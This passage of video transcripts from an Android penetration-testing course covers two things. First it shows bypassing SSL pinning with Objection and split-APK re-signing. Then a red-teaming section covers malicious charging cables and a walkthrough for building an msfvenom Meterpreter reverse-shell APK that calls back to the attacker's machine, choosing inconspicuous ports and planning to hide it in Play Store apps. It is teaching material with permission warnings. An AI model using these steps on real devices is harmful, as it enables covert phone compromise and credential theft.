when you come back to the app to

284
00:11:18.180 --> 00:11:21.220
bypass anything in between there, right?

285
00:11:21.640 --> 00:11:23.760
So, you can look through the source code

286
00:11:23.760 --> 00:11:24.240
of the app.

287
00:11:24.300 --> 00:11:27.340
You can look through the androidmanifest.xml, and

288
00:11:27.340 --> 00:11:29.460
you can actually find different activities.

289
00:11:29.640 --> 00:11:31.380
So, pretty much anything that ends with activity

290
00:11:31.380 --> 00:11:35.560
at the end, you could replace this as

291
00:11:35.560 --> 00:11:37.180
where you want Objection to be patched.

292
00:11:37.380 --> 00:11:39.160
Now, in our case, again, the main activity

293
00:11:39.160 --> 00:11:40.200
is going to be just fine.

294
00:11:40.460 --> 00:11:42.160
I did want to show you this option

295
00:11:42.160 --> 00:11:44.840
with Objection so you can actually customise where

296
00:11:44.840 --> 00:11:46.480
the app is injecting.

297
00:11:47.260 --> 00:11:48.580
All right, so next, what we need to

298
00:11:48.580 --> 00:11:52.100
do, again, we have these split APKs to

299
00:11:52.100 --> 00:11:52.920
mess with, right?

300
00:11:53.320 --> 00:11:55.520
And the interesting thing about these split APKs

301
00:11:55.520 --> 00:11:57.400
is that they need to be signed exactly

302
00:11:57.400 --> 00:12:02.060
the same way as this Objection.apk. So,

303
00:12:02.200 --> 00:12:03.760
what we need to do here is actually

304
00:12:03.760 --> 00:12:06.060
another cool command with Objection.

305
00:12:06.560 --> 00:12:08.420
And all we're going to do is Objection

306
00:12:08.420 --> 00:12:09.940
sign APK.

307
00:12:10.240 --> 00:12:12.080
We're going to sign each one of these

308
00:12:12.080 --> 00:12:13.840
split configs individually.

309
00:12:14.340 --> 00:12:18.560
So, I'm going to do split underscore config

310
00:12:18.560 --> 00:12:21.120
.en.apk and just press enter.

311
00:12:21.500 --> 00:12:23.560
So, it's going to zip align and sign

312
00:12:23.560 --> 00:12:24.100
the app.

313
00:12:24.480 --> 00:12:26.860
Now, we're going to do Objection sign APK

314
00:12:26.860 --> 00:12:29.420
and split.

315
00:12:29.860 --> 00:12:35.520
And now, we'll do the es.apk. And

316
00:12:35.520 --> 00:12:36.880
again, we're going to do this again.

317
00:12:37.480 --> 00:12:48.510
Objection sign APK split x86.apk. That's

318
00:12:48.510 --> 00:12:49.730
spelled sign incorrectly.

319
00:12:52.960 --> 00:12:54.340
And now, we're going to do the last

320
00:12:54.340 --> 00:13:02.790
one, which is xxhdpi.apk. Okay, so now,

321
00:13:02.910 --> 00:13:04.850
if we do a directory listing, we can

322
00:13:04.850 --> 00:13:07.170
see we have all these ones signed with

323
00:13:07.170 --> 00:13:09.470
.objection.apk at the end.

324
00:13:09.770 --> 00:13:12.050
And what we can do now is we

325
00:13:12.050 --> 00:13:15.110
can go back to our phone, and we

326
00:13:15.110 --> 00:13:17.110
can uninstall this XPS app.

327
00:13:22.190 --> 00:13:23.710
And now, we're going to use a new

328
00:13:23.710 --> 00:13:25.310
command with adb as well.

329
00:13:25.410 --> 00:13:27.710
And this is adb instal multiple.

330
00:13:28.490 --> 00:13:31.470
So, instal-multiple.

331
00:13:31.670 --> 00:13:34.930
And this allows you to instal multiple APKs

332
00:13:34.930 --> 00:13:35.470
at once.

333
00:13:35.550 --> 00:13:37.090
I'm sure you can understand what we're going

334
00:13:37.090 --> 00:13:37.650
to be doing here.

335
00:13:37.990 --> 00:13:42.090
We're going to be sending over all of

336
00:13:42.090 --> 00:13:45.570
these ones with .objection.apk over and sending

337
00:13:45.570 --> 00:13:47.630
it as one big app, basically, you need

338
00:13:47.630 --> 00:13:50.370
to have all aspects of this app in

339
00:13:50.370 --> 00:13:51.630
one instal command.

340
00:13:51.850 --> 00:13:52.950
So, let's go ahead and do that.

341
00:13:53.030 --> 00:13:56.810
So, base.objection.apk. Now, we do split

342
00:13:56.810 --> 00:14:04.080
-config.en.objection.apk. Do es.objection.apk,

343
00:14:06.380 --> 00:14:14.260
x86.objection. And here we go, this is

344
00:14:14.260 --> 00:14:14.760
all of them.

345
00:14:14.840 --> 00:14:17.260
So, we have base.objection.apk, split-config

346
00:14:17.260 --> 00:14:21.660
.english, split-config.spanish, x86, and xxhdpi.

347
00:14:21.660 --> 00:14:25.340
And when we press enter here, we should

348
00:14:25.340 --> 00:14:29.060
get a stream successful, instal successful, and we'll

349
00:14:29.060 --> 00:14:31.620
see the new Zaxby's app pop up into

350
00:14:31.620 --> 00:14:34.100
the phone and have all of these split

351
00:14:34.100 --> 00:14:34.880
APKs.

352
00:14:35.180 --> 00:14:37.800
And everything should instal perfectly fine just like

353
00:14:37.800 --> 00:14:38.120
this.

354
00:14:38.560 --> 00:14:40.380
So, this is a bit more manual than

355
00:14:40.380 --> 00:14:41.720
using the other tool I mentioned.

356
00:14:41.840 --> 00:14:43.540
Again, it's called patch-apk.

357
00:14:43.760 --> 00:14:45.400
That can help you to do this really

358
00:14:45.400 --> 00:14:47.240
fast and it actually does everything on your

359
00:14:47.240 --> 00:14:48.580
phone automatically for you.

360
00:14:48.920 --> 00:14:51.220
So, that's a faster method than this.

361
00:14:51.220 --> 00:14:53.180
But I did want to show this as

362
00:14:53.180 --> 00:14:54.960
an option because it is a new vector

363
00:14:54.960 --> 00:14:56.640
that I actually learned on how to deal

364
00:14:56.640 --> 00:14:59.600
with these split configs and the split APKs

365
00:14:59.600 --> 00:15:00.140
in general.

366
00:15:01.600 --> 00:15:04.740
So, as this is installing, we'll just take

367
00:15:04.740 --> 00:15:07.120
a few minutes until we actually see it

368
00:15:07.120 --> 00:15:07.820
be successful.

369
00:15:08.600 --> 00:15:10.080
I guess while we wait for this, we

370
00:15:10.080 --> 00:15:11.180
can actually set up Burp.

371
00:15:11.280 --> 00:15:15.520
So, again, back here in Burp suite, I'm

372
00:15:15.520 --> 00:15:17.140
gonna set up my proxy settings now.

373
00:15:17.620 --> 00:15:20.360
All I'm gonna do is go into my

374
00:15:20.360 --> 00:15:21.460
proxy settings, right?

375
00:15:22.060 --> 00:15:24.100
And here, remember that you have to click

376
00:15:24.100 --> 00:15:26.320
edit and you have to turn all interfaces

377
00:15:26.320 --> 00:15:27.180
on, right?

378
00:15:27.360 --> 00:15:29.480
Here, I'm just gonna select port 8080.

379
00:15:30.520 --> 00:15:32.120
Close this out real quick.

380
00:15:33.300 --> 00:15:35.120
While it's all happening there in the background,

381
00:15:35.240 --> 00:15:37.120
I'm gonna set up my proxy on my

382
00:15:37.120 --> 00:15:37.960
Android emulator.

383
00:15:38.120 --> 00:15:40.780
So, it's 127.0.0.1 and the

384
00:15:40.780 --> 00:15:42.480
port number is 8080.

385
00:15:44.120 --> 00:15:45.600
All right, and so we should be all

386
00:15:45.600 --> 00:15:49.360
set to actually intercept some traffic here on

387
00:15:49.360 --> 00:15:51.940
Burp suite once the app instals.

388
00:15:56.140 --> 00:15:58.020
So, as you can see, the app installed

389
00:15:58.020 --> 00:16:00.420
successfully over here on the left-hand screen.

390
00:16:00.700 --> 00:16:02.460
Took a few minutes, but here is the

391
00:16:02.460 --> 00:16:03.360
Zaxby's app.

392
00:16:03.820 --> 00:16:05.300
Now, on my left-hand side, I'm gonna

393
00:16:05.300 --> 00:16:07.820
go ahead and just get ready with ObjectionX

394
00:16:07.820 --> 00:16:08.180
4.

395
00:16:09.220 --> 00:16:11.740
I click Zaxby's here, go over to my

396
00:16:11.740 --> 00:16:13.740
terminal and press enter and see if we

397
00:16:13.740 --> 00:16:15.140
hook into Objection.

398
00:16:16.860 --> 00:16:18.560
And then there we go, we're hooked.

399
00:16:18.560 --> 00:16:22.480
So, now I go Android, SSL pinning, disable,

400
00:16:23.460 --> 00:16:26.100
and we should start seeing traffic in Burp

401
00:16:26.100 --> 00:16:26.260
suite.

402
00:16:26.360 --> 00:16:27.580
And you can see this came up really

403
00:16:27.580 --> 00:16:28.080
fast.

404
00:16:29.000 --> 00:16:34.020
So, we're intercepting traffic here to zappy.zaxbys

405
00:16:34.020 --> 00:16:37.920
.com HTTPS, and we get all the application

406
00:16:37.920 --> 00:16:38.720
traffic now.

407
00:16:39.980 --> 00:16:42.200
And from here, we can adventure through the

408
00:16:42.200 --> 00:16:44.140
app, looking at whatever we want to.

409
00:16:45.360 --> 00:16:50.440
Let me scroll down a bit here, and

410
00:16:50.440 --> 00:16:53.320
you can look through the application traffic.

411
00:16:53.560 --> 00:16:55.660
You can start doing your API pen testing,

412
00:16:56.120 --> 00:16:57.000
anything like that.

413
00:16:57.180 --> 00:16:58.820
Again, I want to remind you, make sure

414
00:16:58.820 --> 00:17:00.960
you have permission from the app owner before

415
00:17:00.960 --> 00:17:02.880
doing anything with the actual traffic.

416
00:17:03.359 --> 00:17:04.980
I wanted to just show you the flow

417
00:17:04.980 --> 00:17:08.240
of how we actually go ahead, bypass the

418
00:17:08.240 --> 00:17:11.000
SSL pinning, set up the app, and also

419
00:17:11.000 --> 00:17:12.660
how to get through some of that split

420
00:17:12.660 --> 00:17:14.760
APK trouble you might have in some of

421
00:17:14.760 --> 00:17:15.880
the more modern apps.

422
00:17:16.359 --> 00:17:16.839
So, I hope you enjoyed this video.

423
00:17:17.140 --> 00:17:20.000
I hope that you enjoy your Android pen

424
00:17:20.000 --> 00:17:20.760
testing journey.

425
00:17:21.260 --> 00:17:22.440
I hope that you're able to go out

426
00:17:22.440 --> 00:17:25.119
there and prosper and have fun doing so.

427
00:17:25.560 --> 00:17:27.180
Till next time, I hope to see you

428
00:17:27.180 --> 00:17:29.580
in the iOS section, and see you later.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 8: BONUS---Android-Red-Teaming

WEBVTT

1
00:00:00.460 --> 00:00:02.120
(Transcribed by TurboScribe. Go Unlimited to remove this message.) As a bonus section to this course, I

2
00:00:02.120 --> 00:00:04.760
wanted to start putting out some resources out

3
00:00:04.760 --> 00:00:07.420
there for red teaming using mobile devices.

4
00:00:08.100 --> 00:00:09.960
Here we're going to cover things about how

5
00:00:09.960 --> 00:00:15.200
to inject meterpreter shells into Android applications, how

6
00:00:15.200 --> 00:00:17.660
you can use red teaming concepts with mobile

7
00:00:17.660 --> 00:00:20.880
devices, and also how you can use some

8
00:00:20.880 --> 00:00:23.340
other frameworks to achieve similar things to what

9
00:00:23.340 --> 00:00:25.180
we'll be doing with APKs.

10
00:00:25.600 --> 00:00:27.240
The first thing I wanted to talk about

11
00:00:27.240 --> 00:00:28.840
was just cable attacks.

12
00:00:28.840 --> 00:00:30.060
Think about this, right?

13
00:00:30.160 --> 00:00:32.760
Every mobile device has to be charged at

14
00:00:32.760 --> 00:00:34.220
one point or another, right?

15
00:00:34.240 --> 00:00:35.560
We can never get away from that.

16
00:00:35.900 --> 00:00:37.880
And something that has become really, really popular

17
00:00:37.880 --> 00:00:39.700
with a lot of people and a lot

18
00:00:39.700 --> 00:00:43.140
of companies as well is having charging bricks

19
00:00:43.140 --> 00:00:45.240
to carry around with those phones, right?

20
00:00:45.520 --> 00:00:47.200
So if you can imagine this, if you

21
00:00:47.200 --> 00:00:50.880
had a malicious cable between the charging brick

22
00:00:50.880 --> 00:00:52.840
and the phone, or if somehow you were

23
00:00:52.840 --> 00:00:57.200
able to infiltrate the building, right, and replace

24
00:00:57.200 --> 00:00:59.920
the cables with a malicious cable, how would

25
00:00:59.920 --> 00:01:02.560
anyone know that that cable was malicious, right?

26
00:01:02.960 --> 00:01:06.140
Again, only ever use these attacks, these cables,

27
00:01:06.360 --> 00:01:07.980
everything I'll be showing in this section as

28
00:01:07.980 --> 00:01:11.180
well, on targets that you have approval on.

29
00:01:11.340 --> 00:01:13.940
All of this is just educational content, right?

30
00:01:14.180 --> 00:01:15.560
I'm not telling you to go out there

31
00:01:15.560 --> 00:01:16.320
and do this.

32
00:01:17.320 --> 00:01:19.340
These cables are easily purchased and can be

33
00:01:19.340 --> 00:01:22.080
used for many malicious reasons, but you're only

34
00:01:22.080 --> 00:01:25.660
to use this information on targets that you

35
00:01:25.660 --> 00:01:27.060
have permission to do so.

36
00:01:27.560 --> 00:01:30.160
So one of the most famous cables for

37
00:01:30.160 --> 00:01:32.120
this kind of attack is one called the

38
00:01:32.120 --> 00:01:33.080
OMG cable.

39
00:01:33.400 --> 00:01:36.220
They have multiple adapters here, and this is

40
00:01:36.220 --> 00:01:37.860
all part of HAC-5 hardware.

41
00:01:38.240 --> 00:01:41.920
They're fairly expensive though, about $140 each, right?

42
00:01:42.000 --> 00:01:43.660
That's quite a lot for a cable.

43
00:01:44.380 --> 00:01:48.140
And the cable basically, you have your lightning

44
00:01:48.140 --> 00:01:48.900
cable, right?

45
00:01:48.980 --> 00:01:51.440
You have USB-C, USB-A, so different

46
00:01:51.440 --> 00:01:55.320
types of cables for different scenarios, and it

47
00:01:55.320 --> 00:01:57.560
has a keylogger functionality as well.

48
00:01:58.080 --> 00:01:59.740
And also in addition to this, you're going

49
00:01:59.740 --> 00:02:02.480
to have to buy the OMG cable programmer

50
00:02:02.480 --> 00:02:05.740
here, so you're definitely starting off at around

51
00:02:07.080 --> 00:02:11.540
like about $170, $170 for all the things

52
00:02:11.540 --> 00:02:12.840
that you're going to need for the OMG

53
00:02:12.840 --> 00:02:13.300
cable.

54
00:02:13.940 --> 00:02:15.580
You can see all the different features here.

55
00:02:15.800 --> 00:02:17.720
I will add a link to this in

56
00:02:17.720 --> 00:02:18.760
the notes below.

57
00:02:18.760 --> 00:02:21.640
Even shows you how to use the cable

58
00:02:21.640 --> 00:02:22.900
and everything like that.

59
00:02:23.080 --> 00:02:25.380
So the cool thing about the OMG cable

60
00:02:25.380 --> 00:02:27.600
is that you can actually do things like

61
00:02:27.600 --> 00:02:30.780
geofencing here, so only when the phone is

62
00:02:30.780 --> 00:02:33.000
in a certain location will the payload execute.

63
00:02:33.560 --> 00:02:35.540
You can log keys, obviously that can be

64
00:02:35.540 --> 00:02:37.400
very useful for you as a red teamer

65
00:02:37.400 --> 00:02:40.280
if you're looking at trying to get credentials,

66
00:02:40.500 --> 00:02:40.680
right?

67
00:02:40.760 --> 00:02:42.580
So you can get username and password that

68
00:02:42.580 --> 00:02:44.120
might be used to get into an Android

69
00:02:44.120 --> 00:02:45.160
app, etc.

70
00:02:45.460 --> 00:02:47.440
So that can help you to pivot into

71
00:02:47.440 --> 00:02:49.120
other systems as well.

72
00:02:50.000 --> 00:02:53.660
You can see long range, different matches here,

73
00:02:53.740 --> 00:02:55.500
you have the different types of ends for

74
00:02:55.500 --> 00:02:57.300
the cable, and you have to get the

75
00:02:57.300 --> 00:02:58.800
cable programmer as well.

76
00:02:59.420 --> 00:03:00.780
I'm not going to go into the depths

77
00:03:00.780 --> 00:03:02.740
of this cable right now.

78
00:03:02.820 --> 00:03:04.520
I might make a future video on how

79
00:03:04.520 --> 00:03:06.920
to actually use one, but I just wanted

80
00:03:06.920 --> 00:03:08.660
to make you aware of this as a

81
00:03:08.660 --> 00:03:08.960
vector.

82
00:03:09.640 --> 00:03:12.720
And also in addition to this, another nice

83
00:03:12.720 --> 00:03:14.520
website you can go to to look at

84
00:03:14.520 --> 00:03:17.240
some of these types of tools is hackerwarehouse

85
00:03:17.240 --> 00:03:17.880
.com.

86
00:03:18.000 --> 00:03:19.500
A lot of people, they're not so familiar

87
00:03:19.500 --> 00:03:21.180
with this website, a lot of people are

88
00:03:21.180 --> 00:03:24.100
really familiar with hack5, but they actually have

89
00:03:24.100 --> 00:03:25.560
some things that are pretty similar.

90
00:03:25.740 --> 00:03:28.300
So the USB ninja cable here is something

91
00:03:28.300 --> 00:03:30.440
that is quite similar, right?

92
00:03:31.040 --> 00:03:33.780
You can use this as well as a

93
00:03:33.780 --> 00:03:34.600
malicious cable.

94
00:03:35.020 --> 00:03:36.460
So just think about that from the red

95
00:03:36.460 --> 00:03:37.280
teaming perspective.

96
00:03:37.500 --> 00:03:39.800
Where could you inject a cable like this,

97
00:03:39.860 --> 00:03:40.100
right?

98
00:03:40.100 --> 00:03:42.960
You can also change the ends here, so

99
00:03:42.960 --> 00:03:45.260
you have micro, USB-C, etc.

100
00:03:45.540 --> 00:03:47.480
Whatever type of use case you have.

101
00:03:48.220 --> 00:03:49.860
So just keep those in mind.

102
00:03:50.360 --> 00:03:51.820
Those are two different things that you can

103
00:03:51.820 --> 00:03:52.180
use.

104
00:03:52.340 --> 00:03:54.680
Cable attacks are definitely something I would say

105
00:03:54.680 --> 00:03:57.340
is a very juicy vector because you can

106
00:03:57.340 --> 00:04:00.420
always hook them up to say a mobile

107
00:04:00.420 --> 00:04:02.720
power supply and just pass it around to

108
00:04:02.720 --> 00:04:03.800
wherever you're going, right?

109
00:04:03.820 --> 00:04:05.960
Or if you can get into the cable

110
00:04:05.960 --> 00:04:08.380
closet or wherever they're charging the phones up,

111
00:04:08.440 --> 00:04:08.660
right?

112
00:04:09.020 --> 00:04:14.180
You can replace the normal cable with a

113
00:04:14.180 --> 00:04:14.960
malicious one.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.480 --> 00:00:01.940
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, in this video I want to show

2
00:00:01.940 --> 00:00:04.460
you how you can actually inject a Meterpreter

3
00:00:04.460 --> 00:00:07.960
payload into an Android APK, and we're going

4
00:00:07.960 --> 00:00:09.320
to have two different videos here.

5
00:00:09.440 --> 00:00:11.480
So this first one is just going to

6
00:00:11.480 --> 00:00:15.400
be the most simple version of an APK.

7
00:00:15.580 --> 00:00:17.220
It's just going to be a non-feature

8
00:00:17.220 --> 00:00:18.840
-rich application, basically.

9
00:00:18.900 --> 00:00:21.640
It's going to be auto-generated by MSF

10
00:00:21.640 --> 00:00:22.280
Venom, okay?

11
00:00:22.660 --> 00:00:24.220
Then in the next video we're going to

12
00:00:24.220 --> 00:00:27.140
show you actually how to inject Meterpreter Shell

13
00:00:27.140 --> 00:00:30.320
into an existing Android application, okay?

14
00:00:30.500 --> 00:00:31.720
So this one is going to be the

15
00:00:31.720 --> 00:00:34.760
most simple, just like a super plain Jane

16
00:00:34.760 --> 00:00:35.520
application.

17
00:00:35.940 --> 00:00:38.480
Alright, so if you have Kali Linux pulled

18
00:00:38.480 --> 00:00:42.140
up, this is msfvenom-p, and we're going

19
00:00:42.140 --> 00:00:45.660
to choose android slash meterpreter slash reverse underscore

20
00:00:45.660 --> 00:00:46.360
tcp.

21
00:00:46.600 --> 00:00:48.560
So our Android phone is going to reach

22
00:00:48.560 --> 00:00:51.060
back out to our Kali box and try

23
00:00:51.060 --> 00:00:52.400
to establish a session.

24
00:00:52.900 --> 00:00:55.440
lhost, this is just the IP address of

25
00:00:55.440 --> 00:00:58.060
my Kali box, and lport, in my case,

26
00:00:58.160 --> 00:01:01.020
I'm choosing just 446, just because it's a

27
00:01:01.020 --> 00:01:01.660
random port.

28
00:01:02.160 --> 00:01:04.280
You can always choose something else, a lot

29
00:01:04.280 --> 00:01:06.760
of people use 4444 as their default.

30
00:01:07.220 --> 00:01:09.600
Remember, if you're using this for red teaming,

31
00:01:09.700 --> 00:01:12.160
you do not want to use a port

32
00:01:12.160 --> 00:01:14.100
that is going to be seen as suspicious

33
00:01:14.100 --> 00:01:16.660
from a monitoring perspective, right?

34
00:01:16.960 --> 00:01:18.380
So maybe you want to use something like

35
00:01:18.380 --> 00:01:22.840
8080, 8081, 8082, something like that to reach

36
00:01:22.840 --> 00:01:25.000
back, so it kind of looks like normal

37
00:01:25.000 --> 00:01:26.640
HTTP traffic, right?

38
00:01:26.940 --> 00:01:28.440
Okay, and in this case we're going to

39
00:01:28.440 --> 00:01:30.220
do an R, and then we're going to

40
00:01:30.220 --> 00:01:33.680
do an arrow here, so R arrow.

41
00:01:34.040 --> 00:01:36.460
Now we're going to generate an APK, so

42
00:01:36.460 --> 00:01:41.300
I'll just name this android.apk. Okay, and

43
00:01:41.300 --> 00:01:46.890
once this finishes, we will come back to

44
00:01:46.890 --> 00:01:48.710
our prompt here, you can see no platform

45
00:01:48.710 --> 00:01:53.150
selected, got android, dalvik from the payload, and

46
00:01:53.150 --> 00:01:54.410
if I do an ls here, you can

47
00:01:54.410 --> 00:01:57.670
see we have android.apk. Now this is

48
00:01:57.670 --> 00:01:59.710
not completely signed yet, we actually have to

49
00:01:59.710 --> 00:02:02.470
go through the application signing process, okay?

50
00:02:03.030 --> 00:02:05.470
So just like we did before, where we

51
00:02:05.470 --> 00:02:07.509
had to sign an application, go through all

52
00:02:07.509 --> 00:02:09.210
those steps, we have to do those here.

53
00:02:09.590 --> 00:02:11.310
And in this case, I'm just going to

54
00:02:11.310 --> 00:02:14.990
go back to my commands here, so it's

55
00:02:14.990 --> 00:02:17.890
going to be key tool, keygen, generate a

56
00:02:17.890 --> 00:02:21.070
new keystore, in this case mine already exists,

57
00:02:21.150 --> 00:02:24.210
so I'll call this key.keystore2, and we'll

58
00:02:24.210 --> 00:02:28.050
do this alias as keystore.

59
00:02:30.190 --> 00:02:32.650
Okay, and new password, I'll just do something

60
00:02:32.650 --> 00:02:33.110
simple.

61
00:02:34.450 --> 00:02:36.630
Okay, and you can just go through this,

62
00:02:36.730 --> 00:02:38.350
and you can put details if you want

63
00:02:38.350 --> 00:02:40.210
or not to make it seem more legitimate,

64
00:02:40.690 --> 00:02:42.390
in my case I'll just skip it all.

65
00:02:43.550 --> 00:02:45.770
Okay, and now the next command after we

66
00:02:45.770 --> 00:02:48.930
generate our keystore is we're going to have

67
00:02:48.930 --> 00:02:50.790
to do a jar signer, right?

68
00:02:50.990 --> 00:02:53.350
So jar signer, and then we're going to

69
00:02:53.350 --> 00:02:57.770
say key.keystore, and in this case we

70
00:02:57.770 --> 00:03:02.970
named this android.apk, right?

71
00:03:03.190 --> 00:03:08.010
And our alias there was, I think it

72
00:03:08.010 --> 00:03:10.750
was just test, it was just keystore, so

73
00:03:10.750 --> 00:03:12.110
keystore here.

74
00:03:12.350 --> 00:03:13.990
This is just like how we signed the

75
00:03:13.990 --> 00:03:16.530
application earlier in the course, so please go

76
00:03:16.530 --> 00:03:19.190
back to that video and refer to that

77
00:03:19.190 --> 00:03:21.150
if you need additional help beyond this.

78
00:03:21.890 --> 00:03:26.530
Okay, so provide my keystore password, abc123, and

79
00:03:26.530 --> 00:03:34.150
certificate chain not found, my name in my

80
00:03:34.150 --> 00:03:35.550
keystore, I think I had to fix that,

81
00:03:35.650 --> 00:03:39.370
so it's key.keystore2. So just correct this,

82
00:03:41.660 --> 00:03:44.680
abc123 is my password, very simple this time,

83
00:03:44.740 --> 00:03:45.860
so now you can see that the jar

84
00:03:45.860 --> 00:03:46.460
is signed.

85
00:03:46.700 --> 00:03:48.320
Last thing we need to do is just

86
00:03:48.320 --> 00:03:52.760
zip align-v4 and android.apk. Now we

87
00:03:52.760 --> 00:03:54.440
can name this whatever we want, and I

88
00:03:54.440 --> 00:03:59.360
will just call this hackedapp.apk. Okay, and

89
00:03:59.360 --> 00:04:00.620
we can do an ls here, we can

90
00:04:00.620 --> 00:04:04.420
see hackedapp.apk. Now if you refer back

91
00:04:04.420 --> 00:04:06.380
to the beginning of the course, I had

92
00:04:06.380 --> 00:04:10.340
a video about networking your vm to your

93
00:04:10.340 --> 00:04:12.800
emulator, so here I'm on a vm, my

94
00:04:12.800 --> 00:04:17.920
ip address is 192.168.127.241, and

95
00:04:17.920 --> 00:04:20.519
my emulator is over here on my actual

96
00:04:20.519 --> 00:04:21.800
host windows machine.

97
00:04:22.140 --> 00:04:25.600
Okay, and I use the command adb-a

98
00:04:25.600 --> 00:04:29.160
nodaemon-server to open a port here for

99
00:04:29.160 --> 00:04:31.720
the emulator, so please refer back to that

100
00:04:31.720 --> 00:04:34.080
video as well, it is in the android

101
00:04:34.080 --> 00:04:38.720
setup section, it's called how to network your

102
00:04:38.720 --> 00:04:41.420
android device to a vm or some other

103
00:04:41.420 --> 00:04:42.300
networked device.

104
00:04:42.760 --> 00:04:46.100
Okay, so if I wanted to instal this

105
00:04:46.100 --> 00:04:49.840
app now from my kali box to my

106
00:04:49.840 --> 00:04:51.920
android phone, I can just do the command

107
00:04:51.920 --> 00:04:55.240
adb-h, and in this case the ip

108
00:04:55.240 --> 00:04:59.820
address of my windows host is 192.168

109
00:04:59.820 --> 00:05:08.780
.127.182 and dash p 5037, and then

110
00:05:08.780 --> 00:05:11.820
I'm going to do an instal, just like

111
00:05:11.820 --> 00:05:13.740
a normal adb command, right?

112
00:05:14.420 --> 00:05:16.380
So it'll be adb instal and then the

113
00:05:16.380 --> 00:05:17.900
name of the app, which in our case

114
00:05:17.900 --> 00:05:21.940
is just hackedapp.apk, and it will pop

115
00:05:21.940 --> 00:05:26.040
up here that it was successfully installed in

116
00:05:26.040 --> 00:05:26.700
just a second.

117
00:05:32.600 --> 00:05:34.240
Oops, I do have a wrong port number

118
00:05:34.240 --> 00:05:35.180
here, this should be 5037.

119
00:05:37.080 --> 00:05:39.820
There we go, so performing streamed instal, success.

120
00:05:40.300 --> 00:05:41.920
We come back to my emulator that's on

121
00:05:41.920 --> 00:05:45.140
my windows host now, this main activity right

122
00:05:45.140 --> 00:05:48.240
here, this is the really generic android application,

123
00:05:48.660 --> 00:05:52.540
so obviously it just looks like a strange

124
00:05:52.540 --> 00:05:53.560
application, right?

125
00:05:53.620 --> 00:05:54.980
Maybe you would click it or not.

126
00:05:55.660 --> 00:05:57.120
Ideally what we want to do from a

127
00:05:57.120 --> 00:05:59.860
red teaming perspective is disguise this as another

128
00:05:59.860 --> 00:06:01.780
application that will be shown in the next

129
00:06:01.780 --> 00:06:03.320
video, but I wanted to show you these

130
00:06:03.320 --> 00:06:05.640
concepts just from the beginning.

131
00:06:05.880 --> 00:06:07.160
So the last thing we need to do

132
00:06:07.160 --> 00:06:09.080
to prove that this is working is just

133
00:06:09.080 --> 00:06:11.000
open a meterpreter shell, right?

134
00:06:11.240 --> 00:06:12.840
So I already have this set up, if

135
00:06:12.840 --> 00:06:15.600
I do show options, you have my L

136
00:06:15.600 --> 00:06:17.580
host here, which is my Kali Linux IP

137
00:06:17.580 --> 00:06:19.980
address, and my port, which I set up

138
00:06:19.980 --> 00:06:22.740
with the msfvenom payload as 446.

139
00:06:23.140 --> 00:06:24.360
So all I have to do now is

140
00:06:24.360 --> 00:06:27.320
do run, and it will start listening here

141
00:06:27.320 --> 00:06:31.080
on my handler, and if I go into

142
00:06:31.080 --> 00:06:33.660
the app, click it, it's going to ask

143
00:06:33.660 --> 00:06:35.900
me permissions, tonnes of permissions here, right?

144
00:06:35.960 --> 00:06:38.180
So if you ever instal an app looking

145
00:06:38.180 --> 00:06:40.620
for all these types of permissions, obviously that

146
00:06:40.620 --> 00:06:42.520
is very bad, and this would be a

147
00:06:42.520 --> 00:06:44.440
red flag to a lot of users, right?

148
00:06:44.500 --> 00:06:46.700
So that's kind of a reason why this

149
00:06:46.700 --> 00:06:50.060
is not really the best approach, obviously, but

150
00:06:50.060 --> 00:06:52.780
let's just click continue and see what happens.

151
00:06:53.360 --> 00:06:54.880
So it says the app was built for

152
00:06:54.880 --> 00:06:56.920
an older version of Android, but you can

153
00:06:56.920 --> 00:06:58.960
see here we have our command shell session

154
00:06:58.960 --> 00:07:02.160
3 opened, and it's the IP address of

155
00:07:02.160 --> 00:07:04.720
our Windows host coming back to our Kali

156
00:07:04.720 --> 00:07:05.480
Linux box.

157
00:07:05.920 --> 00:07:08.780
In this case the shell does not work

158
00:07:08.780 --> 00:07:11.920
functionally because it is an emulator on my

159
00:07:11.920 --> 00:07:14.500
Windows machine, but you can easily imagine if

160
00:07:14.500 --> 00:07:16.060
you were on the same network as an

161
00:07:16.060 --> 00:07:18.980
Android device and they ran this app, then

162
00:07:18.980 --> 00:07:21.060
boom, you would have your shell at this

163
00:07:21.060 --> 00:07:21.680
point, right?

164
00:07:21.860 --> 00:07:23.560
The only thing we can really do to

165
00:07:23.560 --> 00:07:26.700
improve our opsec is to conceal it within

166
00:07:26.700 --> 00:07:29.020
another Android application, right?

167
00:07:29.200 --> 00:07:31.140
So let's hop into the next video and

168
00:07:31.140 --> 00:07:32.580
learn how to do that as well.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:02.210
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Hey everyone and welcome back to the course.

2
00:00:02.350 --> 00:00:03.510
In this video I'm going to show you

3
00:00:03.510 --> 00:00:05.950
how you can actually inject a meterpreter payload

4
00:00:05.950 --> 00:00:08.170
into any app from the Play Store.

5
00:00:08.410 --> 00:00:09.850
In the video we're just going to do

6
00:00:09.850 --> 00:00:11.650
this with Android, but you can do it

7
00:00:11.650 --> 00:00:13.430
with any app from the Play Store.

8
00:00:13.870 --> 00:00:16.630
Please refer to the previous video on how

9
00:00:16.630 --> 00:00:19.170
to make a generic app using MSF Venom

10
00:00:19.170 --> 00:00:22.070
if you'd like to learn that, because it's

11
00:00:22.070 --> 00:00:23.430
going to be very similar to what we're

12
00:00:23.430 --> 00:00:24.270
going to do here.

13
00:00:24.910 --> 00:00:27.230
Okay, now before we get started I do

14
00:00:27.230 --> 00:00:29.110
need you, if you're using a Kali machine,

15
00:00:29.110 --> 00:00:32.330
to make sure that your version of apktool

16
00:00:32.330 --> 00:00:33.570
is aligned with mine.

17
00:00:33.770 --> 00:00:36.930
So I do the command apktool-version.

18
00:00:37.890 --> 00:00:39.690
Okay we're going to see that mine is

19
00:00:39.690 --> 00:00:43.210
set as 2.6.1. Now by default

20
00:00:43.210 --> 00:00:46.090
what I have downloaded from the Kali repos

21
00:00:46.090 --> 00:00:50.790
is actually 2.5.x-dirty, and if

22
00:00:50.790 --> 00:00:53.990
you have that version of apktool this will

23
00:00:53.990 --> 00:00:54.670
not work.

24
00:00:55.030 --> 00:00:56.230
Now I actually had to go through quite

25
00:00:56.230 --> 00:00:57.970
